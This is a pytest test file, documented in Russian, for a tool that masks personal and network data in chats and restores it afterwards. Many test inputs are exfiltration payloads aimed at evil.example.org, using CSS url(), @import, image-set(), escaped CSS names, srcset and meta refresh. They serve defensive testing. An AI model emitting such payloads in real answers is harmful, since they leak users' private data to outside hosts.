        '<style>a{background:url("https://evil.example.org/?q= <EMAIL_1>")}</style>',
        "<style>a{background:url( 'https://evil.example.org/?q= <EMAIL_1>' )}</style>",
        "a { background: URL(https://evil.example.org/?q= <EMAIL_1>) }",
        '@font-face { src: url("https://evil.example.org/f?q=\\" <EMAIL_1>") }',
        'b { background: url("https://evil.example.org/?q=\n<EMAIL_1>") }',
        '@import "https://evil.example.org/?q= <EMAIL_1>";',
        "@import url('https://evil.example.org/?q= <EMAIL_1>');",
        '<style>a{background:url("https://evil.example.org/?q= <EMAIL_1></style>',
        "@import 'https://evil.example.org/?q= <EMAIL_1>",
    ],
)
def test_nothing_is_restored_inside_a_foreign_css_url(settings, answer):
    """FINDINGS P2 «Restore: CSS url("…") with a space inside a style element»: адрес в url(…) и @import
    загружается сам и в элементе style, и в файле CSS; аргумент — целиком, до той же кавычки или до «)».
    Строку без закрывающей кавычки CSS кончает концом текста и тоже загружает (найдено при исправлении
    image-set)."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer",
    [
        '@import/**/"https://evil.example.org/?q= <EMAIL_1>";',
        "<style>@import /* стили */ 'https://evil.example.org/?q= <EMAIL_1>';</style>",
        '@import\n/* a */ /* b */\n"https://evil.example.org/?q= <EMAIL_1>"',
        r'@\69mport/**/"https://evil.example.org/?q= <EMAIL_1>";',
        '@import/**/"https://evil.example.org/?q=;<EMAIL_1>";',
        "@import /* см. https://evil.example.org/?q=<EMAIL_1>",
    ],
)
def test_nothing_is_restored_inside_an_import_after_a_comment(settings, answer):
    """Хэнд-офф, P2: между @import и строкой браузер пропускает и комментарии, не только пробелы. Комментарий без
    конца тянется до конца ответа, как в CSS, и адрес в нём тоже проверяется."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer, restored",
    [
        (
            "@import url(https://host-1.domain-1.example/<EMAIL_1>.css);",
            "@import url(https://srv-dc01.contoso.ru/ivanov@contoso.ru.css);",
        ),
        (
            '@import /* автор <EMAIL_1> */ "https://host-1.domain-1.example/a.css";',
            '@import /* автор ivanov@contoso.ru */ "https://srv-dc01.contoso.ru/a.css";',
        ),
        (
            '@import "https://evil.example.org/a.css"; /* автор <EMAIL_1> */',
            '@import "https://evil.example.org/a.css"; /* автор ivanov@contoso.ru */',
        ),
        (
            "Правило @import подключает стили (см. https://wiki.example.org/css), автор <EMAIL_1>",
            "Правило @import подключает стили (см. https://wiki.example.org/css), автор ivanov@contoso.ru",
        ),
    ],
)
def test_own_and_nearby_imports_are_restored(settings, answer, restored):
    """Та же находка с другой стороны: наш адрес в @import и метка в комментарии перед ним восстанавливаются, как и
    метка после закрытой строки и в тексте, где @import только упомянут: ссылка — лишь пробелы и комментарии за
    @import и первая строка после них."""
    assert restore(link_state(), answer, settings).text == restored


@pytest.mark.parametrize(
    "answer",
    [
        '<style>a{background-image:image-set("https://evil.example.org/?q= <EMAIL_1>" 1x)}</style>',
        "<style>a{background-image:-webkit-image-set('https://evil.example.org/?q= <EMAIL_1>' 1x)}</style>",
        '@font-face { src: src("https://evil.example.org/f?q= <EMAIL_1>") }',
        'a { background: image-set("a.png" 1x, "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
        'a { background: IMAGE-SET(\n  "a.png" 1x,\n  "https://evil.example.org/?q= <EMAIL_1>" 2x\n) }',
        'a { background: image-set(linear-gradient(rgb(0 0 0/50%), red) 1x,'
        ' "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
        'a { background: image-set("a).png" 1x, /* ) */ "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
        'a { background: image-set(var(--a, {;}) 1x, "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
        'a { background: image-set(' + "f(" * 6 + ")" * 6 + ' 1x, "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
        '<style>a{background:image-set("a.png" 1x, "https://evil.example.org/?q= <EMAIL_1>"',
    ],
)
def test_nothing_is_restored_inside_a_foreign_css_image_set(settings, answer):
    """Хэнд-офф, P2: строку в image-set() — в любом варианте, не только в первом, — и в src() браузер загружает
    сам, как url(). Вызов берётся целиком по скобкам: градиент, var() с блоком, «)» в строке и в комментарии его
    не кончают; вложенность глубже разбираемой и незакрытый вызов тянутся до конца ответа."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer, restored",
    [
        (
            'b { background: image-set("img/<EMAIL_1>.png" 1x) }',
            'b { background: image-set("img/ivanov@contoso.ru.png" 1x) }',
        ),
        (
            'b { background: image-set("https://host-1.domain-1.example/a b.png" 1x, "c.png" 2x) }',
            'b { background: image-set("https://srv-dc01.contoso.ru/a b.png" 1x, "c.png" 2x) }',
        ),
        (
            'b { background: image-set("https://evil.example.org/a.png" 1x) } /* автор <EMAIL_1> */',
            'b { background: image-set("https://evil.example.org/a.png" 1x) } /* автор ivanov@contoso.ru */',
        ),
        (
            "Функция image-set() выбирает картинку (см. https://wiki.example.org/css), автор <EMAIL_1>",
            "Функция image-set() выбирает картинку (см. https://wiki.example.org/css), автор ivanov@contoso.ru",
        ),
    ],
)
def test_own_and_nearby_css_image_sets_are_restored(settings, answer, restored):
    """Та же находка с другой стороны: наш и относительный адрес в image-set() восстанавливаются, метка после
    закрытого вызова — тоже, и в тексте, где image-set() только упомянут."""
    assert restore(link_state(), answer, settings).text == restored


@pytest.mark.parametrize(
    "answer, restored",
    [
        (
            '<style>a{background:url("https://host-1.domain-1.example/a b.png")}</style>',
            '<style>a{background:url("https://srv-dc01.contoso.ru/a b.png")}</style>',
        ),
        ("a { background: url(img/<EMAIL_1>.png) }", "a { background: url(img/ivanov@contoso.ru.png) }"),
        (
            'a { background: url("https://evil.example.org/a.png") } /* автор <EMAIL_1> */',
            'a { background: url("https://evil.example.org/a.png") } /* автор ivanov@contoso.ru */',
        ),
    ],
)
def test_own_and_nearby_css_urls_are_restored(settings, answer, restored):
    """Та же находка с другой стороны: наш и относительный адрес в url() восстанавливаются, метка
    рядом с чужим url() — тоже."""
    assert restore(link_state(), answer, settings).text == restored


@pytest.mark.parametrize(
    "answer",
    [
        r'<style>a{background:u\72l("https://evil.example.org/?q= <EMAIL_1>")}</style>',
        r'<style>a{background:image-s\65t("https://evil.example.org/?q= <EMAIL_1>" 1x)}</style>',
        r'<style>@\69mport "https://evil.example.org/?q= <EMAIL_1>";</style>',
        r'<p style="background:\75rl(https://evil.example.org/?q=<EMAIL_1>)">',
        r'a{background:u\72l("https://evil.example.org/?q= <EMAIL_1>")}',
        r'@\69mport "https://evil.example.org/?q= <EMAIL_1>";',
        r'a { background: \000055 R\4c ("https://evil.example.org/?q= <EMAIL_1>") }',
        "a { background: u\\72\r\nl('https://evil.example.org/?q= <EMAIL_1>') }",
        r'@font-face { src: s\000072c("https://evil.example.org/f?q= <EMAIL_1>") }',
        r'a { background: \2d webkit\2d image\2d set("https://evil.example.org/?q= <EMAIL_1>" 1x) }',
        r'@\i\m\p\o\r\t "https://evil.example.org/?q= <EMAIL_1>";',
        r"a { background: \u\r\l(https://evil.example.org/?q= <EMAIL_1>) }",
    ],
)
def test_nothing_is_restored_inside_a_css_loader_with_an_escaped_name(settings, answer):
    """Хэнд-офф, P2: браузер раскрывает экранирования в именах CSS («\\72», «\\000072 » и «\\r» — это «r»), и
    u\\72l(), image-s\\65t(), @\\69mport загружают адрес, как url(), image-set() и @import, — в элементе style, в
    атрибуте style и в файле CSS без тегов: шесть цифр кода, пробел или CRLF после кода, другой регистр."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer",
    [
        r'<style>a{background:url("\2f\2f evil.example.org/?q=<EMAIL_1>")}</style>',
        r'a{background:url("https://host-1.domain-1.example\40 evil.example.org/?q=<EMAIL_1>")}',
        r"""<p style="background:url('\2f\2f evil.example.org/?q=<EMAIL_1>')">""",
        r"a{background:url(\2f\2f evil.example.org/?q=<EMAIL_1>)}",
        r'@import "\2f\2f evil.example.org/?q=<EMAIL_1>";',
        r'a{background:image-set("\2f\2f evil.example.org/?q=<EMAIL_1>" 1x)}',
        r"a{background:u\72l(https://host-1.domain-1.example/?q=<EMAIL_1>)}",
    ],
)
def test_css_link_with_an_escape_is_never_ours(settings, answer):
    """Найдено при исправлении имён, P1: экранирования браузер раскрывает и в самом адресе — «\\2f\\2f »
    становится «//», «\\40 » — «@», — и загружает не тот хост, что виден в тексте. Ссылка CSS с «\\» в имени
    или в адресе нашей не считается."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer, restored",
    [
        (
            r"<style>.md\:flex{display:flex} a{background:url(img/<EMAIL_1>.png)}</style>",
            r"<style>.md\:flex{display:flex} a{background:url(img/ivanov@contoso.ru.png)}</style>",
        ),
        (
            r'<style>q::before{content:"\201C"} /* автор <EMAIL_1> */</style>',
            r'<style>q::before{content:"\201C"} /* автор ivanov@contoso.ru */</style>',
        ),
        (
            r'a { background: u\72l("https://evil.example.org/a.png") } /* автор <EMAIL_1> */',
            r'a { background: u\72l("https://evil.example.org/a.png") } /* автор ivanov@contoso.ru */',
        ),
        (r"\left( <EMAIL_1> \right)", r"\left( ivanov@contoso.ru \right)"),
        (r"C:\Users\<EMAIL_1>\src(1).txt", r"C:\Users\ivanov@contoso.ru\src(1).txt"),
    ],
)
def test_css_escapes_outside_a_loaded_address_do_not_stop_restoring(settings, answer, restored):
    """Та же находка с другой стороны: экранирование в селекторе и в строке content, закрытый вызов с
    экранированным именем без меток внутри, «\\left(» в формуле и «\\src(» в пути Windows восстановлению
    рядом не мешают."""
    assert restore(link_state(), answer, settings).text == restored


@pytest.mark.parametrize(
    "answer, restored",
    [
        (
            'requests.post(url, data="Отчёт https://wiki.example.org/x, автор <EMAIL_1>")',
            'requests.post(url, data="Отчёт https://wiki.example.org/x, автор ivanov@contoso.ru")',
        ),
        (
            '<b>Пример</b>\nsend(to,\n     content="Ссылка https://wiki.example.org/x <EMAIL_1>")',
            '<b>Пример</b>\nsend(to,\n     content="Ссылка https://wiki.example.org/x ivanov@contoso.ru")',
        ),
    ],
)
def test_keyword_argument_in_code_is_not_a_link_attribute(settings, answer, restored):
    """FINDINGS P3 «Small regressions and gaps after the plan 1В fixes», восстановление: data=, content= в
    вызове вне тегов HTML — не атрибут ссылки; адреса в значении проверяются как в обычном тексте."""
    assert restore(link_state(), answer, settings).text == restored


@pytest.mark.parametrize(
    "answer",
    [
        'requests.post(url, data="https://evil.example.org/?q=<EMAIL_1>")',
        '<img alt=a, srcset="https://evil.example.org/?q= <EMAIL_1>">',
        '<a title="a>b" href="https://evil.example.org/?q= <EMAIL_1>">',
        '<!-- <a title=" --> <img data-x=" <b>" alt=a, srcset="https://evil.example.org/?q= <EMAIL_1>">',
        'Добавьте в тег srcset="https://evil.example.org/?q= <EMAIL_1>"',
    ],
)
def test_attribute_that_may_be_inside_a_tag_stays_a_link(settings, answer):
    """Та же находка с другой стороны: всё, что может оказаться атрибутом тега, — по-прежнему ссылка."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


def labelled_hosts() -> tuple[ChatState, Settings]:
    """Адрес, чья подмена совпала с открытым адресом (раздел 6.2), и имя узла не того вида получают метки."""
    state = ChatState(chat_id="labelled", net_key=bytes(range(32)))
    real = ipaddress.IPv4Address("192.168.1.5")
    fake = str(ipaddress.IPv4Address(netmap.map_private(int(real), 16, state.net_key)))
    settings = Settings(never=frozenset({fake}))
    state.rules.append(ChatRule("mask", "srv web 02", T.HOST))
    sanitize(state, f"адрес {real} рядом с {fake}, узел srv web 02, почта ivanov@contoso.ru", settings)
    assert {"<IP_1>", "<HOST_1>", "<EMAIL_1>"} <= set(state.surrogates)
    return state, settings


@pytest.mark.parametrize(
    "answer, restored",
    [
        ("http://<IP_1>:8080/status?u=<EMAIL_1>", "http://192.168.1.5:8080/status?u=ivanov@contoso.ru"),
        ("[статус](http://IP_1:8080/status)", "[статус](http://192.168.1.5:8080/status)"),
        ('<a href="https://&lt;HOST_1&gt;/wiki">', '<a href="https://srv web 02/wiki">'),
    ],
)
def test_link_to_a_labelled_address_or_host_is_restored(answer, restored):
    """FINDINGS P2 «Resolve and restore: … labelled link hosts not restored»: метка адреса или имени узла,
    выданная вместо подмены, в хосте ссылки — наш узел."""
    state, settings = labelled_hosts()
    assert restore(state, answer, settings).text == restored


@pytest.mark.parametrize(
    "answer",
    ["https://<IP_1>.evil.example.org/?q=<IP_1>", "https://<EMAIL_1>/?q=<IP_1>", "https://evil.example.org/<IP_1>"],
)
def test_labelled_host_does_not_make_a_foreign_link_ours(answer):
    """Та же находка с другой стороны: метка под чужим доменом и метки других типов наш узел не задают."""
    state, settings = labelled_hosts()
    result = restore(state, answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


def labelled_domains() -> ChatState:
    """Домену в имени дана метка: выделение задело его внутри имени (host-1.<TERM_1>), домен сменил тип (<ORG_1>)."""
    state = ChatState(chat_id="domains", net_key=bytes(range(32)))
    sanitize(state, "узел srv01.contoso.ru, узел srv02.northwind.ru, сайт northwind.ru", Settings())
    ops.retype(state, next(e for e in state.entities.values() if e.key == "northwind.ru").id, T.ORG)
    ops.mask(state, "fabrikam", T.TERM)
    ops.mask(state, "Заря", T.TERM)
    text = "узел host-1.fabrikam.ru, узел srv02.northwind.ru, почта ivanov@contoso.ru, проект Заря"
    assert sanitize(state, text, Settings()).sanitized == (
        "узел host-1.<TERM_1>, узел host-2.<ORG_1>, почта <EMAIL_1>, проект <TERM_2>"
    )
    return state


@pytest.mark.parametrize(
    "answer, restored",
    [
        ("https://www.host-1.<TERM_1>/?q=<EMAIL_1>", "https://www.srv01.fabrikam.ru/?q=ivanov@contoso.ru"),
        ("[вики](https://host-1.<TERM_1>/<EMAIL_1>)", "[вики](https://srv01.fabrikam.ru/ivanov@contoso.ru)"),
        ("https://<TERM_1>/?q=<EMAIL_1>", "https://fabrikam.ru/?q=ivanov@contoso.ru"),
        ("https://www.host-2.<ORG_1>/?q=<EMAIL_1>", "https://www.srv02.northwind.ru/?q=ivanov@contoso.ru"),
        ("https://mail.<ORG_1>/?q=<EMAIL_1>", "https://mail.northwind.ru/?q=ivanov@contoso.ru"),
    ],
)
def test_link_to_a_name_under_a_labelled_domain_is_restored(settings, answer, restored):
    """Наблюдение раунда имён узлов, P3: «www.host-1.fabrikam.ru» с выделением fabrikam стал «www.host-1.<TERM_1>», и
    восстановление считало его чужой ссылкой — метка TERM не наш узел. Метка, значение которой — доменное имя, в хосте
    ссылки — наш домен, как domain-N.example, и служебные части перед ней — тоже."""
    result = restore(labelled_domains(), answer, settings)
    assert result.text == restored and "foreign_link" not in kinds(result)


@pytest.mark.parametrize(
    "answer",
    [
        "https://www.<TERM_1>.evil.example.org/?q=<EMAIL_1>",
        "https://evil.<TERM_1>/?q=<EMAIL_1>",
        "https://host-1.<TERM_2>/?q=<EMAIL_1>",
        "https://<TERM_2>/?q=<EMAIL_1>",
        "https://<EMAIL_1>/?q=<TERM_1>",
    ],
)
def test_label_of_a_domain_does_not_make_a_foreign_link_ours(settings, answer):
    """Та же находка с другой стороны: наша метка домена в чужом имени и неизвестная часть перед ней ссылку не пускают,
    а метка значения, которое не доменное имя («Заря», адрес e-mail), хостом не бывает."""
    result = restore(labelled_domains(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


def test_label_ending_a_recorded_name_is_a_domain_whatever_its_suffix(settings):
    """Наблюдение раунда имён узлов, P3: доменом метку считают одинаково конвейер и восстановление (labels.domain_labels).
    Домен с неизвестным суффиксом из адреса ссылки, которому дали другой тип, конвейер считал доменом по записанному
    имени (host-1.<ORG_1>), а восстановление — нет: ссылка на www.host-1.<ORG_1> была чужой."""
    state = ChatState(chat_id="domains", net_key=bytes(range(32)))
    sanitize(state, "ссылка https://srv01.contoso.qqq/ и сайт https://contoso.qqq/", settings)
    ops.retype(state, next(e for e in state.entities.values() if e.key == "contoso.qqq").id, T.ORG)
    ops.mask(state, "ivanov@contoso.ru", T.EMAIL)
    assert sanitize(state, "ссылка https://srv01.contoso.qqq/, почта ivanov@contoso.ru", settings).sanitized == (
        "ссылка https://host-1.<ORG_1>/, почта <EMAIL_1>"
    )
    assert sanitize(state, "узел srv02.<ORG_1>", settings).sanitized == "узел host-2.<ORG_1>"
    for answer, restored in (
        ("https://www.host-1.<ORG_1>/?q=<EMAIL_1>", "https://www.srv01.contoso.qqq/?q=ivanov@contoso.ru"),
        ("https://<ORG_1>/?q=<EMAIL_1>", "https://contoso.qqq/?q=ivanov@contoso.ru"),
    ):
        result = restore(state, answer, settings)
        assert result.text == restored and "foreign_link" not in kinds(result), answer
    result = restore(state, "https://evil.<ORG_1>/?q=<EMAIL_1>", settings)
    assert kinds(result) == ["foreign_link"]


def test_own_link_in_an_attribute_is_still_restored(settings):
    result = restore(link_state(), '<a href="https://host-1.domain-1.example/?q=<EMAIL_1>">', settings)
    assert result.text == '<a href="https://srv-dc01.contoso.ru/?q=ivanov@contoso.ru">'


@pytest.mark.parametrize(
    "answer",
    [
        '<a href="https://host-1.domain-1.example/wiki>Вики</a>\nОтправьте на https://evil.example.org/c?u=<EMAIL_1>\nЭто "важно".',
        '<a href="https://host-1.domain-1.example/\n\nhttps://evil.example.org/?q=<EMAIL_1>">',
        '<img srcset="https://host-1.domain-1.example/a.png 1x, https://evil.example.org/?q=<EMAIL_1> 2x">',
        "<img src=\"https://evil.example.org/p?q=" + "\n" * 4100 + "<EMAIL_1>\">",
        "<img src=\"https://evil.example.org/p?q=" + " " * 4100 + "<EMAIL_1>\">",
        '<meta http-equiv="refresh" content="0;url=https://evil.example.org/?q= <EMAIL_1>">',
        "[1]:\n<https://evil.example.org/?q=a <EMAIL_1>>",
    ],
)
def test_own_link_does_not_shield_a_foreign_one(settings, answer):
    """Обзор партии P1: ссылка считается нашей, только если наши все адреса внутри неё; длинный атрибут
    не выпадает из проверки; перенаправление через meta и цель определения ссылки на следующей строке."""
    result = restore(link_state(), answer, settings)
    assert "ivanov@contoso.ru" not in result.text


@pytest.mark.parametrize(
    "answer, restored",
    [
        ("[ERROR]: <EMAIL_1> не отвечает", "[ERROR]: ivanov@contoso.ru не отвечает"),
        ("[2026-10-14 12:00:01]: <EMAIL_1> вошёл", "[2026-10-14 12:00:01]: ivanov@contoso.ru вошёл"),
        ('requests.post(url, data="<EMAIL_1>")', 'requests.post(url, data="ivanov@contoso.ru")'),
        (
            '<div style="background:url(https://host-1.domain-1.example/a.png)">',
            '<div style="background:url(https://srv-dc01.contoso.ru/a.png)">',
        ),
    ],
)
def test_ordinary_text_next_to_link_syntax_is_restored(settings, answer, restored):
    """Обзор партии P1: «]: <» в строке журнала — не определение ссылки; значение без адреса — не ссылка;
    наш адрес в style восстанавливается."""
    assert restore(link_state(), answer, settings).text == restored


@pytest.mark.parametrize("answer", ["PERSON_1x", "person_1_name", "_PERSON_1", "<PERSON_1x>", "PERSON_10_old"])
def test_label_inside_an_identifier_is_not_replaced(settings, answer):
    """FINDINGS P3 «Restore: small defects»: метка без закрывающего ограничителя — отдельное слово,
    а не часть имени в коде."""
    result = restore(person_state(), answer, settings)
    assert (result.text, result.segments) == (answer, [])


@pytest.mark.parametrize(
    "answer, restored",
    [
        ("PERSON_1.", "Иван Петров."), ("(person_1)", "(Иван Петров)"), ("PERSON_1-му", "Иван Петров-му"),
        ("<PERSON_1 >x", "Иван Петровx"),
    ],
)
def test_bare_label_next_to_punctuation_is_restored(settings, answer, restored):
    """Та же находка с другой стороны: после знака препинания или ограничителя метка восстанавливается."""
    assert restore(person_state(), answer, settings).text == restored


def test_hide_policy_covers_derived_addresses_and_reformatted_macs(settings):
    """FINDINGS P3 «Restore: small defects»: политика «скрывать без восстановления» действует и на адрес
    в фиктивной подсети, и на MAC в другой записи."""
    state = infra_state()
    fake = next(text for text, surrogate in state.surrogates.items() if surrogate.kind == "ip")
    answer = f"резервный {fake.rsplit('.', 1)[0]}.99, интерфейс 02-00-00-00-00-01"
    hidden = Settings(policies={**default_policies(), T.IP: Policy.HIDE, T.MAC: Policy.HIDE})
    result = restore(state, answer, hidden)
    assert (result.text, kinds(result), result.counters["kept"]) == (answer, ["kept_by_policy"] * 2, 2)
    assert kinds(restore(state, answer, settings)) == ["derived", "altered"]


def test_value_set_by_the_user_is_restored_for_hosts_addresses_macs_and_sids(settings):
    """FINDINGS P3 «Restore: small defects»: значение, заданное пользователем (FR-6.4), важнее записанного
    при выдаче; имя узла целиком собирается из значений своих частей, нетронутые части — как были."""
    state = ChatState(chat_id="fixed", net_key=bytes(range(32)))
    text = "srv-web01.corp.contoso.ru, 10.1.2.5, 00:1A:2B:3C:4D:5E, S-1-5-21-1004336348-1177238915-682003330-512"
    sanitize(state, text, settings)
    fake = next(text for text, surrogate in state.surrogates.items() if surrogate.kind == "ip")
    sid = next(text for text, surrogate in state.surrogates.items() if surrogate.kind == "sid")
    for surrogate, value in (
        ("host-1", "srv-web02"), ("domain-1.example", "fabrikam.ru"), (fake, "10.1.2.6"),
        ("02:00:00:00:00:01", "00:1A:2B:3C:4D:5F"), (sid, "S-1-5-21-1-2-3"),
    ):
        ops.set_restore_value(state, state.surrogates[surrogate].entity_id, value)
    answer = f"host-1.sub-2.domain-1.example, HOST-1, newbox.domain-1.example, {fake}, 02-00-00-00-00-01, {sid}-512"
    assert restore(state, answer, settings).text == (
        "srv-web02.corp.fabrikam.ru, SRV-WEB02, newbox.fabrikam.ru, 10.1.2.6, 00:1A:2B:3C:4D:5F, S-1-5-21-1-2-3-512"
    )


def network_saved_earlier(network: str, fake: str) -> ChatState:
    """Чат, сохранённый до второго раунда IP (15.10.2026): сеть IPv6 и публичная IPv4 из правила пользователя получали
    подмену-адрес без длины префикса."""
    state = ChatState(chat_id="networks", net_key=bytes(range(32)))
    entity = Entity("net", T.IP, 1, network, network, "manual", [network])
    state.entities[entity.id] = entity
    state.surrogates[fake] = Surrogate(entity.id, network, "ip6" if ":" in fake else "ip")
    state.issued[f"{entity.id}|ip"] = fake
    state.rules.append(ChatRule("mask", network, T.IP))
    state.counters["IP"] = 1
    return state


@pytest.mark.parametrize(
    "network, fake", [("2a00:1450:4010::/64", "2001:db8:1::1"), ("8.8.8.0/24", "203.0.113.1")], ids=["ipv6", "public_ipv4"],
)
def test_prefix_written_after_a_network_surrogate_is_not_doubled(settings, network, fake):
    """FINDINGS «Restore round of 15.10», (2): сеть IPv6 и публичная IPv4 из правила пользователя получали подмену-адрес
    без длины префикса, и ответ «подмена/64» восстанавливался в «…/64/64». В чатах, сохранённых тогда, подмена осталась
    прежней, и сеть восстанавливается без своей длины, если ответ пишет свою, — длина остаётся та, что в ответе."""
    state = network_saved_earlier(network, fake)
    assert sanitize(state, f"сеть {network}", settings).sanitized == f"сеть {fake}"
    address, length = network.split("/")
    answer = f"сеть {fake}/{length}, она же {fake}; шире — {fake}/16"
    assert restore(state, answer, settings).text == f"сеть {network}, она же {network}; шире — {address}/16"


@pytest.mark.parametrize("network", ["2a00:1450:4010::/64", "8.8.8.0/24"], ids=["ipv6", "public_ipv4"])
def test_network_surrogate_with_its_prefix_restores_like_a_private_network(settings, network):
    """Раздел 6.3: подмена сети IPv6 и публичной IPv4 теперь с длиной префикса и восстанавливается, как у частной сети
    IPv4: целиком — сетью, адресом — адресом, а длина, которую ответ пишет за адресом, остаётся."""
    state = ChatState(chat_id="networks", net_key=bytes(range(32)))
    ops.mask(state, network, T.IP)
    [fake] = sanitize(state, f"сеть {network}", settings).sanitized.split()[1:]
    address, length = network.split("/")
    assert fake.endswith(f"/{length}")
    bare = fake.split("/")[0]
    answer = f"сеть {fake}, адрес {bare}; шире — {bare}/16"
    assert restore(state, answer, settings).text == f"сеть {network}, адрес {address}; шире — {address}/16"


def test_open_address_equal_to_a_network_surrogate_without_its_prefix_stays_open(settings):
    """Находка ревью раунда IP (15.10): правило 10.1.0.0/16 и «никогда не скрывать» 10.90.0.0 — подмена сети 10.90.0.0/16,
    и открытый 10.90.0.0 восстанавливался в 10.1.0.0. Теперь сеть получает метку, а открытый адрес остаётся собой."""
    opened = netmap.fake_ip("10.1.0.0/16", ChatState(chat_id="other", net_key=bytes(range(32)))).split("/")[0]
    never = Settings(never=frozenset({opened}))
    state = ChatState(chat_id="networks", net_key=bytes(range(32)))
    ops.mask(state, "10.1.0.0/16", T.IP)
    text = f"сеть 10.1.0.0/16, открытый {opened}"
    sanitized = sanitize(state, text, never).sanitized
    assert sanitized == f"сеть <IP_1>, открытый {opened}"
    assert restore(state, sanitized, never).text == text


def test_prefix_written_after_a_network_label_is_not_doubled(settings):
    """Та же находка: сеть, которой выдана метка (подмена совпала с открытым адресом), — и в искажённой записи метки."""
    state = ChatState(chat_id="networks", net_key=bytes(range(32)))
    ops.mask(state, "2a00:1450:4010::/64", T.IP)
    opened = Settings(never=frozenset({"2001:db8:1::1"}))
    assert sanitize(state, "сеть 2a00:1450:4010::/64", opened).sanitized == "сеть <IP_1>"
    assert restore(state, "сеть <IP_1>/64 и IP_1/64, она же <IP_1>", opened).text == (
        "сеть 2a00:1450:4010::/64 и 2a00:1450:4010::/64, она же 2a00:1450:4010::/64"
    )


def test_private_networks_and_addresses_with_a_prefix_restore_to_their_own_originals(settings):
    """С другой стороны: частная сеть IPv4 получает подмену с длиной префикса и восстанавливается сама (целиком или
    адресом), адрес узла с длиной префикса (6.2) — тоже сам, а за адресом без длины префикса длина из ответа остаётся."""
    state = ChatState(chat_id="networks", net_key=bytes(range(32)))
    for value in ("10.1.0.0/16", "10.1.2.5/16"):
        ops.mask(state, value, T.IP)
    sanitized = sanitize(state, "сеть 10.1.0.0/16, узел 10.1.2.5/16 и 10.1.3.7", settings).sanitized
    network, host, address = (word.rstrip(",") for word in sanitized.split()[1::2])
    answer = f"{network}, {network.split('/')[0]}; {host}, {host.split('/')[0]}; {address}/24"
    assert restore(state, answer, settings).text == "10.1.0.0/16, 10.1.0.0; 10.1.2.5/16, 10.1.2.5; 10.1.3.7/24"


@pytest.mark.parametrize("answer", ["EMAİL_1", "<EMAİL_1>", "[[EMAİL_1]]", "PERſON_1", "hoſt-1"])
def test_letters_that_fold_to_ascii_are_not_label_letters(settings, answer):
    """FINDINGS P3 «Restore: small defects»: «İ» и «ſ» при поиске без учёта регистра совпадали с «I» и «S»,
    и «EMAİL_1» ронял восстановление. Тип метки — латиница, другой регистр допускается только у неё."""
    state = link_state()
    state.entities.update(person_state().entities)
    state.surrogates["<PERSON_1>"] = Surrogate("p1")
    result = restore(state, answer, settings)
    assert (result.text, result.segments) == (answer, [])
    assert restore(state, "<email_1> и person_1", settings).text == "ivanov@contoso.ru и Иван Петров"


@pytest.mark.parametrize(
    "answer, restored",
    [
        ("file:///C:/Users/<PERSON_1>/a.txt", "file:///C:/Users/Иван Петров/a.txt"),
        ("x = 1; //TODO:<PERSON_1>", "x = 1; //TODO:Иван Петров"),
        ("//TODO(<PERSON_1>): проверить", "//TODO(Иван Петров): проверить"),
        (r"file:\\\C:\Users\<PERSON_1>\a.txt", r"file:\\\C:\Users\Иван Петров\a.txt"),
        (r"\\fs01\home\<PERSON_1>", r"\\fs01\home\Иван Петров"),
    ],
)
def test_local_file_link_and_code_comment_are_not_foreign_links(settings, answer, restored):
    """FINDINGS P3 «Restore: small defects»: «file:///» без хоста и «//TODO:» в коде на чужой узел не ведут;
    с обратными косыми (хэнд-офф, P1) — так же, и путь UNC к узлу без домена тоже."""
    assert restore(person_state(), answer, settings).text == restored


@pytest.mark.parametrize(
    "answer",
    [
        "file://evil.example.org/share/<PERSON_1>",
        "file:////evil.example.org/share/<PERSON_1>",
        "//<PERSON_1>.evil.example.org/x",
        "///evil.example.org/?q=<PERSON_1>",
        "//1572395042/?q=<PERSON_1>",
        "//evil%2Eexample%2Eorg/?q=<PERSON_1>",
        "//evil。example。org/?q=<PERSON_1>",
        "//TODO:x//evil/?q=<PERSON_1>",
        r"\\1572395042\?q=<PERSON_1>",
        r"\\fs01\?next=\\1572395042\<PERSON_1>",
    ],
)
def test_file_and_protocol_relative_links_to_a_host_stay_foreign(settings, answer):
    """Та же находка с другой стороны: хост у «file://», имя с точкой (и то, что браузер превратит в точку),
    число вместо IPv4 и второй адрес — в том числе за обратными косыми — оставляют ссылку чужой."""
    result = restore(person_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


def _stream_state() -> ChatState:
    state = person_state()
    sanitize(state, "почта i.petrov@contoso.ru, узел srv-db02.contoso.ru, адрес 10.1.2.5", Settings())
    return state


def test_label_cut_at_every_position_restores_like_the_whole_answer(settings):
    """AC-3.3: метка разрезана между фрагментами в каждой позиции — промежуточный показ не врёт, итог как у целого."""
    state = _stream_state()
    [host] = [text for text, s in state.surrogates.items() if text.startswith("host-") and "domain-" in text]
    [ip] = [text for text, s in state.surrogates.items() if s.kind == "ip"]
    answer = f"Связаться: <PERSON_10> и <PERSON_1>, \\<EMAIL\\_1\\>; узел {host}, адрес {ip}.\nГотово"
    whole = restore(state, answer, settings).text
    for cut in range(len(answer) + 1):
        restorer = StreamRestorer(state, settings)
        shown = [restorer.feed(answer[:cut]), restorer.feed(answer[cut:])]
        for text in shown:
            assert "Иван Петров0" not in text and "Иван Петров" not in text.replace("Иван Петров,", ""), (cut, text)
            assert whole.startswith(text), (cut, text)
        assert restorer.finish().text == whole


def test_nothing_is_shown_before_the_first_space(settings):
    restorer = StreamRestorer(person_state(), settings)
    assert restorer.feed("<PERSON_1") == ""
